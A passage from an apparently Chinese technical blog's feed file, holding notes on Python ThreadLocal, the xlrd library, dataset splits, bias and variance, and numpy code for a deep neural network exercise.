class="token punctuation">(</span><span class="token punctuation">)</span>    t2<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <strong>输出</strong>  </p><pre class="line-numbers language-python"><code class="language-python">  hello<span class="token punctuation">,</span> Alce <span class="token punctuation">(</span><span class="token keyword">in</span> Thread<span class="token operator">-</span>A<span class="token punctuation">)</span>    hello<span class="token punctuation">,</span> myAlce <span class="token punctuation">(</span><span class="token keyword">in</span> Thread<span class="token operator">-</span>A<span class="token punctuation">)</span>    myAlce    hello<span class="token punctuation">,</span> Bob <span class="token punctuation">(</span><span class="token keyword">in</span> Thread<span class="token operator">-</span>B<span class="token punctuation">)</span>    hello<span class="token punctuation">,</span> myBob <span class="token punctuation">(</span><span class="token keyword">in</span> Thread<span class="token operator">-</span>B<span class="token punctuation">)</span>    myBob  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>解析<br>  全局变量local_school就是一个ThreadLocal对象，每个Thread对它都可以读写student属性，但互不影响。你可以把local_school看成全局变量，但每个属性如local_school.student都是线程的局部变量，可以任意读写而互不干扰，也不用管理锁的问题，ThreadLocal内部会处理。  </p><p>  可以理解为全局变量local_school是一个dict，不但可以用local_school.student，还可以绑定其他变量，如local_school.teacher等等。  </p><p>  ThreadLocal最常用的地方就是为每个线程绑定一个数据库连接，HTTP请求，用户身份信息等，这样一个线程的所有调用到的处理函数都可以非常方便地访问这些资源  </p></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 计科 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python-xlrd</title>
      <link href="/2019/05/06/2019-python-xlrd-jian-dan-zong-jie/"/>
      <url>/2019/05/06/2019-python-xlrd-jian-dan-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="python-xlrd"><a href="#python-xlrd" class="headerlink" title="python-xlrd"></a>python-xlrd</h2><h3 id="打开"><a href="#打开" class="headerlink" title="打开"></a>打开</h3><blockquote><p><code>data = xlrd.open_workbook(path)</code> # 打开表格  </p></blockquote><h3 id="工作表"><a href="#工作表" class="headerlink" title="工作表"></a>工作表</h3><ul><li>获取所有工作表的名字  <blockquote><p><code>names = data.sheet_names()</code>  </p></blockquote></li><li>获取工作表中有效的行数  <blockquote><p> <code>narows = table.nrows</code>  </p></blockquote></li><li>获取工作表对象  <blockquote><p><code>table = data.sheet_by_name(&#39;2019年05月上网流量&#39;)</code><br><code>tabel = data.sheets()[0]</code>  </p></blockquote></li></ul><h3 id="行列操作-行-row-列-col"><a href="#行列操作-行-row-列-col" class="headerlink" title="行列操作(行-row,列-col)"></a>行列操作(行-row,列-col)</h3><blockquote><p>编号从<strong>0</strong>开始  </p></blockquote><ul><li>获取行列数据  <blockquote><p><code>onelist = table.row_slice(1)// table.row(1)</code>   # 返回该行组成的列表()  </p></blockquote></li><li>获取行的每个单元格数据类型组成的列表  <blockquote><p><code>typelist = table.row_types(2)</code>  </p></blockquote></li><li>获取行的所有数据的值组成的列表  <blockquote><p><code>datalist = table.row_values(2)</code>  </p></blockquote></li><li>获取行中有效的单元格数(<strong>列</strong>没有这个方法)  <blockquote><p><code>lenrow = table.row_len(2)</code>  </p></blockquote></li></ul><h3 id="单元格操作"><a href="#单元格操作" class="headerlink" title="单元格操作"></a>单元格操作</h3><ul><li>返回单元格对象  <blockquote><p><code>table.cell(rowx, colx)</code>  </p></blockquote></li><li>返回单元格的数据类型  <blockquote><p><code>table.cell_type(rowx, colx)</code>  </p></blockquote></li><li>返回单元格中的数据  <blockquote><p><code>table.cell_vale(rowx, colx)</code>  </p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据处理 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>训练/开发/测试集</title>
      <link href="/2019/04/11/2019-xun-lian-kai-fa-ce-shi-ji/"/>
      <url>/2019/04/11/2019-xun-lian-kai-fa-ce-shi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="训练-开发-测试集"><a href="#训练-开发-测试集" class="headerlink" title="训练/开发/测试集"></a>训练/开发/测试集</h1><h2 id="训练时一般需要调试的参数"><a href="#训练时一般需要调试的参数" class="headerlink" title="训练时一般需要调试的参数"></a>训练时一般需要调试的参数</h2><ul><li>layers 层数  </li><li>hidden units 每层多少个隐藏单元  </li><li>learning rate 学习率时多少  </li><li>activation functions 每层选取什么激活函数  </li><li>。。。。。。  </li><li>对于参数的调试，实际上是一个不断尝试与修正的过程，调试-&gt;代码更改-&gt;实验-&gt;调试。  </li></ul><h2 id="验证集与测试集"><a href="#验证集与测试集" class="headerlink" title="验证集与测试集"></a>验证集与测试集</h2><ul><li>小规模数据一般7：3 或者 6：2：2  </li><li>大规模数据，比如百万级数据，一般训练集高达95%，验证集3%，测试集2%，验证集与测试集可能还会更小  </li><li>还有就是训练验证集一定会有，而训练测试集不一定有，但是人们一般习惯如果只把数据分成两份的话，其中一份会被称为训练测试集，这样不太专业，实际上应该叫做训练验证集。  </li><li>尽量保证验证集与测试集来自同一分布。  </li></ul><p><img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=1083249931,1842019217&fm=26&gp=0.jpg" alt="滑稽">   </p>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 吴恩达深度学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1.2偏差与方差</title>
      <link href="/2019/04/09/2019-pian-chai-yu-fang-chai/"/>
      <url>/2019/04/09/2019-pian-chai-yu-fang-chai/</url>
      
        <content type="html"><![CDATA[<h2 id="1-2-偏差与方差"><a href="#1-2-偏差与方差" class="headerlink" title="1.2 偏差与方差"></a>1.2 偏差与方差</h2><h3 id="二者在深度学习上的现状"><a href="#二者在深度学习上的现状" class="headerlink" title="二者在深度学习上的现状"></a>二者在深度学习上的现状</h3><ul><li>一般将二者分开考虑，并不考虑二者的权衡  </li></ul><h3 id="偏差"><a href="#偏差" class="headerlink" title="偏差"></a>偏差</h3><ul><li>偏差高，欠拟合  </li><li>描述的是训练集的测试结果和事实标签之间的差距  </li></ul><h3 id="方差"><a href="#方差" class="headerlink" title="方差"></a>方差</h3><ul><li>方差高，过拟合  </li><li>描述的是训练集与验证集之间的准确性的差距  </li></ul><h3 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h3><ul><li>高方差  <ul><li>Train set error: 1%  </li><li>Dev set error: 11%  </li></ul></li><li>高偏差  <ul><li>Train set error： 15%  </li><li>Dev ser error: 16%  </li></ul></li><li>高偏差,高方差  <ul><li>Train set error: 15%  </li><li>Dev set error: 30%  </li></ul></li><li>低偏差，低方差  <ul><li>Train set error: 0.5%  </li><li>Dev set error: 1%  </li></ul></li></ul><h3 id="最优误差"><a href="#最优误差" class="headerlink" title="最优误差"></a>最优误差</h3><p><strong>最优误差</strong>也被称为贝叶斯误差，是指在现有特征集上，任意可以基于特征输入进行随机输出的分类器所能达到的最小误差。比如说图片已经模糊到人眼无法分辨了，即使最优的分类器也无法分辨，此时最优误差便会大于零  </p><h3 id="机器学习与方差和偏差的处理"><a href="#机器学习与方差和偏差的处理" class="headerlink" title="机器学习与方差和偏差的处理"></a>机器学习与方差和偏差的处理</h3><h4 id="模型训练流程"><a href="#模型训练流程" class="headerlink" title="模型训练流程"></a>模型训练流程</h4><ol><li>初始模型训练  </li><li>首先知道偏差高不高  <ol><li>如果偏差比较高，试着评估训练集或训练数据的性能  </li><li>如果偏差特别高，那么就要考虑选择一个新的网络了（  <ul><li>更多隐藏层或隐藏单元的网络  </li><li>或者花更多的时间来训练网络  </li><li>或者尝试更先进的优化算法  </li></ul></li></ol></li><li>检查方差  <ol><li>如果方差比较高  <ol><li>最好的解决方法就是采用更多的数据  </li><li>尝试通过正则话来减少过拟合  </li><li>寻找更合适的神经网络架构  </li></ol></li></ol></li></ol><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul><li>必须要清楚的知道存在的问题使偏差还是方差，还是两者的问题  </li><li>高偏差和高方差的解决方案是不同的  </li><li>一般采用更大的网络和数据可以同时减小方差和偏差<br><img src="https://i.loli.net/2019/04/16/5cb5197c7ca39.jpg" alt="机器学习基础.jpg">  </li></ul>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 吴恩达深度学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深层神经网络</title>
      <link href="/2019/04/09/2019-shen-ceng-shen-jing-wang-luo/"/>
      <url>/2019/04/09/2019-shen-ceng-shen-jing-wang-luo/</url>
      
        <content type="html"><![CDATA[<h1 id="第四周作业"><a href="#第四周作业" class="headerlink" title="第四周作业"></a>第四周作业</h1><h2 id="知识回顾"><a href="#知识回顾" class="headerlink" title="知识回顾"></a>知识回顾</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li><p>初始化网络参数  </p></li><li><p>前向传播<br> 2.1 计算一层的中线性求和的部分  </p><p> 2.2 计算激活函数的部分（ReLU使用L-1次，Sigmod使用1次）  </p><p> 2.3 结合线性求和与激活函数  </p></li><li><p>计算误差  </p></li><li><p>反向传播  </p><p> 4.1 线性部分的反向传播公式  </p><p> 4.2 激活函数部分的反向传播公式  </p><p> 4.3 结合线性部分与激活函数的反向传播公式  </p></li><li><p>更新参数  </p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="https://i.screenshot.net/y50rfmx" alt="Alt">  </p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  <span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt  np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#随机种子  </span><span class="token comment" spellcheck="true"># sigmoid 函数  </span><span class="token keyword">def</span> <span class="token function">sigmoid</span><span class="token punctuation">(</span>Z<span class="token punctuation">)</span><span class="token punctuation">:</span>      A <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span>Z<span class="token punctuation">)</span><span class="token punctuation">)</span>      cache <span class="token operator">=</span> Z      <span class="token keyword">return</span> A<span class="token punctuation">,</span> cache  <span class="token comment" spellcheck="true"># 反向sigmoid函数求导  </span><span class="token keyword">def</span> <span class="token function">sigmoid_backward</span><span class="token punctuation">(</span>dA<span class="token punctuation">,</span> cache<span class="token punctuation">)</span><span class="token punctuation">:</span>      Z <span class="token operator">=</span> cache      s <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span>Z<span class="token punctuation">)</span><span class="token punctuation">)</span>      dZ <span class="token operator">=</span> dA <span class="token operator">*</span> s <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> s<span class="token punctuation">)</span>      <span class="token keyword">assert</span><span class="token punctuation">(</span>dZ<span class="token punctuation">.</span>shape <span class="token operator">==</span> Z<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>      <span class="token keyword">return</span> dZ  <span class="token comment" spellcheck="true"># relu函数  </span><span class="token keyword">def</span> <span class="token function">relu</span><span class="token punctuation">(</span>Z<span class="token punctuation">)</span><span class="token punctuation">:</span>      A <span class="token operator">=</span> np<span class="token punctuation">.</span>maximum<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> Z<span class="token punctuation">)</span>      <span class="token keyword">assert</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>shape <span class="token operator">==</span> Z<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>      cache <span class="token operator">=</span> Z      <span class="token keyword">return</span> A<span class="token punctuation">,</span> cache  <span class="token comment" spellcheck="true"># 反向 relu 函数求导  </span><span class="token keyword">def</span> <span class="token function">relu_backward</span><span class="token punctuation">(</span>dA<span class="token punctuation">,</span> cache<span class="token punctuation">)</span><span class="token punctuation">:</span>      Z <span class="token operator">=</span> cache      dZ <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>dA<span class="token punctuation">,</span> copy<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>      dZ<span class="token punctuation">[</span>Z<span class="token operator">&lt;=</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>      <span class="token keyword">assert</span><span class="token punctuation">(</span>dZ<span class="token punctuation">.</span>shape <span class="token operator">==</span> Z<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>      <span class="token keyword">return</span> dZ  <span class="token comment" spellcheck="true"># 两层神经网络  </span><span class="token keyword">def</span> <span class="token function">initialize_parameters</span><span class="token punctuation">(</span>n_x<span class="token punctuation">,</span> n_h<span class="token punctuation">,</span> n_y<span class="token punctuation">)</span><span class="token punctuation">:</span>      W1 <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>n_h<span class="token punctuation">,</span> n_x<span class="token punctuation">)</span>      b1 <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>n_h<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>      W2 <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>n_y<span class="token punctuation">,</span> n_h<span class="token punctuation">)</span>      b2 <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>n_y<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>      <span class="token keyword">assert</span><span class="token punctuation">(</span>W1<span class="token punctuation">.</span>shape <span class="token operator">==</span> <span class="token punctuation">(</span>n_h<span class="token punctuation">,</span> n_x<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">assert</span><span class="token punctuation">(</span>b1<span class="token punctuation">.</span>shape <span class="token operator">==</span> <span class="token punctuation">(</span>n_h<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">assert</span><span class="token punctuation">(</span>W2<span class="token punctuation">.</span>shape <span class="token operator">==</span> <span class="token punctuation">(</span>n_y<span class="token punctuation">,</span> n_h<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">assert</span><span class="token punctuation">(</span>b2<span class="token punctuation">.</span>shape <span class="token operator">==</span> <span class="token punctuation">(</span>n_y<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      parameters <span class="token operator">=</span> <span class="token punctuation">{</span>          <span class="token string">"W1"</span> <span class="token punctuation">:</span> W1<span class="token punctuation">,</span>          <span class="token string">"b1"</span> <span class="token punctuation">:</span> b1<span class="token punctuation">,</span>          <span class="token string">"W2"</span> <span class="token punctuation">:</span> W2<span class="token punctuation">,</span>          <span class="token string">"b2"</span> <span class="token punctuation">:</span> b2      <span class="token punctuation">}</span>      <span class="token keyword">return</span> parameters  <span class="token comment" spellcheck="true"># 多层神经网络参数初始化  </span><span class="token keyword">def</span> <span class="token function">initialize_parameters_deep</span><span class="token punctuation">(</span>layers_dims<span class="token punctuation">)</span><span class="token punctuation">:</span>      np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>      parameters <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>      L <span class="token operator">=</span> len<span class="token punctuation">(</span>layers_dims<span class="token punctuation">)</span>      <span class="token keyword">for</span> l <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> L<span class="token punctuation">)</span><span class="token punctuation">:</span>          parameters<span class="token punctuation">[</span><span class="token string">"W"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>layers_dims<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">,</span> layers_dims<span class="token punctuation">[</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">/</span> np<span class="token punctuation">.</span>sqrt<span class="token punctuation">(</span>layers_dims<span class="token punctuation">[</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>          parameters<span class="token punctuation">[</span><span class="token string">"b"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span>layers_dims<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token keyword">assert</span><span class="token punctuation">(</span>parameters<span class="token punctuation">[</span><span class="token string">"W"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>shape <span class="token operator">==</span> <span class="token punctuation">(</span>layers_dims<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">,</span> layers_dims<span class="token punctuation">[</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token keyword">assert</span><span class="token punctuation">(</span>parameters<span class="token punctuation">[</span><span class="token string">"b"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>shape <span class="token operator">==</span> <span class="token punctuation">(</span>layers_dims<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> parameters  <span class="token comment" spellcheck="true"># 前行传播  </span><span class="token keyword">def</span> <span class="token function">linear_forward</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> W<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>      Z <span class="token operator">=</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>W<span class="token punctuation">,</span> A<span class="token punctuation">)</span> <span class="token operator">+</span> b      <span class="token keyword">assert</span><span class="token punctuation">(</span>Z<span class="token punctuation">.</span>shape <span class="token operator">==</span> <span class="token punctuation">(</span>W<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> A<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      cache <span class="token operator">=</span> <span class="token punctuation">(</span>A<span class="token punctuation">,</span> W<span class="token punctuation">,</span> b<span class="token punctuation">)</span>      <span class="token keyword">return</span> Z<span class="token punctuation">,</span> cache  <span class="token comment" spellcheck="true"># 线性激活  </span><span class="token keyword">def</span> <span class="token function">linear_activation_forward</span><span class="token punctuation">(</span>A_prev<span class="token punctuation">,</span> W<span class="token punctuation">,</span> b<span class="token punctuation">,</span> activation<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">if</span> activation <span class="token operator">==</span> <span class="token string">"sigmoid"</span><span class="token punctuation">:</span>          Z<span class="token punctuation">,</span> linear_cache <span class="token operator">=</span> linear_forward<span class="token punctuation">(</span>A_prev<span class="token punctuation">,</span> W<span class="token punctuation">,</span>b<span class="token punctuation">)</span>          A<span class="token punctuation">,</span> activation_cache <span class="token operator">=</span> sigmoid<span class="token punctuation">(</span>Z<span class="token punctuation">)</span>      <span class="token keyword">elif</span> activation <span class="token operator">==</span> <span class="token string">"relu"</span><span class="token punctuation">:</span>          Z<span class="token punctuation">,</span> linear_cache <span class="token operator">=</span> linear_forward<span class="token punctuation">(</span>A_prev<span class="token punctuation">,</span> W<span class="token punctuation">,</span> b<span class="token punctuation">)</span>          A<span class="token punctuation">,</span> activation_cache <span class="token operator">=</span> relu<span class="token punctuation">(</span>Z<span class="token punctuation">)</span>      <span class="token keyword">assert</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>shape <span class="token operator">==</span> <span class="token punctuation">(</span>W<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>A_prev<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      cache <span class="token operator">=</span> <span class="token punctuation">(</span>linear_cache<span class="token punctuation">,</span> activation_cache<span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># print(relu(Z))  </span>    <span class="token keyword">return</span> A<span class="token punctuation">,</span>cache  <span class="token comment" spellcheck="true"># 多层前行传播  </span><span class="token keyword">def</span> <span class="token function">L_model_forward</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span> parameters<span class="token punctuation">)</span><span class="token punctuation">:</span>      caches <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>      A <span class="token operator">=</span> X      L <span class="token operator">=</span> len<span class="token punctuation">(</span>parameters<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>      <span class="token keyword">for</span> l <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> L<span class="token punctuation">)</span><span class="token punctuation">:</span>          A_prev <span class="token operator">=</span> A          A<span class="token punctuation">,</span> cache <span class="token operator">=</span>  linear_activation_forward<span class="token punctuation">(</span>                                              A_prev<span class="token punctuation">,</span> parameters<span class="token punctuation">[</span><span class="token string">"W"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                                             parameters<span class="token punctuation">[</span><span class="token string">'b'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'relu'</span><span class="token punctuation">)</span>          caches<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cache<span class="token punctuation">)</span>      AL<span class="token punctuation">,</span> cache <span class="token operator">=</span> linear_activation_forward<span class="token punctuation">(</span>A<span class="token punctuation">,</span> parameters<span class="token punctuation">[</span><span class="token string">"W"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                                         parameters<span class="token punctuation">[</span><span class="token string">'b'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'sigmoid'</span><span class="token punctuation">)</span>      caches<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cache<span class="token punctuation">)</span>      <span class="token keyword">assert</span><span class="token punctuation">(</span>AL<span class="token punctuation">.</span>shape <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> X<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> AL<span class="token punctuation">,</span> caches  <span class="token comment" spellcheck="true"># 计算成本  </span><span class="token keyword">def</span> <span class="token function">compute_cost</span><span class="token punctuation">(</span>AL<span class="token punctuation">,</span> Y<span class="token punctuation">)</span><span class="token punctuation">:</span>      m <span class="token operator">=</span> Y<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>      cost <span class="token operator">=</span> <span class="token operator">-</span>np<span class="token punctuation">.</span>sum<span class="token punctuation">(</span>np<span class="token punctuation">.</span>multiply<span class="token punctuation">(</span>np<span class="token punctuation">.</span>log<span class="token punctuation">(</span>AL<span class="token punctuation">)</span><span class="token punctuation">,</span> Y<span class="token punctuation">)</span> <span class="token operator">+</span> np<span class="token punctuation">.</span>multiply<span class="token punctuation">(</span>np<span class="token punctuation">.</span>log<span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> AL<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">-</span> Y<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> m      cost <span class="token operator">=</span> np<span class="token punctuation">.</span>squeeze<span class="token punctuation">(</span>cost<span class="token punctuation">)</span>      <span class="token keyword">assert</span><span class="token punctuation">(</span>cost<span class="token punctuation">.</span>shape <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> cost  <span class="token comment" spellcheck="true"># 后向传播线性部分  </span><span class="token keyword">def</span> <span class="token function">linear_backward</span><span class="token punctuation">(</span>dZ<span class="token punctuation">,</span> cache<span class="token punctuation">)</span><span class="token punctuation">:</span>      A_prev<span class="token punctuation">,</span> W<span class="token punctuation">,</span> b <span class="token operator">=</span> cache      m <span class="token operator">=</span> A_prev<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>      dW <span class="token operator">=</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>dZ<span class="token punctuation">,</span> A_prev<span class="token punctuation">.</span>T<span class="token punctuation">)</span> <span class="token operator">/</span> m      db <span class="token operator">=</span> np<span class="token punctuation">.</span>sum<span class="token punctuation">(</span>dZ<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> keepdims<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token operator">/</span> m      dA_prev <span class="token operator">=</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>W<span class="token punctuation">.</span>T<span class="token punctuation">,</span> dZ<span class="token punctuation">)</span>      <span class="token keyword">assert</span><span class="token punctuation">(</span>dA_prev<span class="token punctuation">.</span>shape <span class="token operator">==</span> A_prev<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>      <span class="token keyword">assert</span><span class="token punctuation">(</span>dW<span class="token punctuation">.</span>shape <span class="token operator">==</span> W<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>      <span class="token keyword">assert</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>shape <span class="token operator">==</span> b<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>      <span class="token keyword">return</span> dA_prev<span class="token punctuation">,</span> dW<span class="token punctuation">,</span> db  <span class="token comment" spellcheck="true"># 向后传播激活  </span><span class="token keyword">def</span> <span class="token function">linear_activation_backward</span><span class="token punctuation">(</span>dA<span class="token punctuation">,</span> cache<span class="token punctuation">,</span> activation<span class="token operator">=</span><span class="token string">"relu"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      linear_cache<span class="token punctuation">,</span> activation_cache <span class="token operator">=</span> cache      <span class="token keyword">if</span> activation <span class="token operator">==</span> <span class="token string">"relu"</span><span class="token punctuation">:</span>          dZ <span class="token operator">=</span> relu_backward<span class="token punctuation">(</span>dA<span class="token punctuation">,</span> activation_cache<span class="token punctuation">)</span>          dA_prev<span class="token punctuation">,</span> dW<span class="token punctuation">,</span> db <span class="token operator">=</span> linear_backward<span class="token punctuation">(</span>dZ<span class="token punctuation">,</span> linear_cache<span class="token punctuation">)</span>      <span class="token keyword">elif</span> activation <span class="token operator">==</span> <span class="token string">"sigmoid"</span><span class="token punctuation">:</span>          dZ <span class="token operator">=</span> sigmoid_backward<span class="token punctuation">(</span>dA<span class="token punctuation">,</span> activation_cache<span class="token punctuation">)</span>          dA_prev<span class="token punctuation">,</span> dW<span class="token punctuation">,</span> db <span class="token operator">=</span> linear_backward<span class="token punctuation">(</span>dZ<span class="token punctuation">,</span> linear_cache<span class="token punctuation">)</span>      <span class="token keyword">return</span> dA_prev<span class="token punctuation">,</span> dW<span class="token punctuation">,</span> db  <span class="token comment" spellcheck="true"># 多层向后传播函数  </span><span class="token keyword">def</span> <span class="token function">L_model_backward</span><span class="token punctuation">(</span>AL<span class="token punctuation">,</span> Y<span class="token punctuation">,</span> caches<span class="token punctuation">)</span><span class="token punctuation">:</span>      grads <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>      L <span class="token operator">=</span> len<span class="token punctuation">(</span>caches<span class="token punctuation">)</span>      m <span class="token operator">=</span> AL<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>      Y <span class="token operator">=</span> Y<span class="token punctuation">.</span>reshape<span class="token punctuation">(</span>AL<span 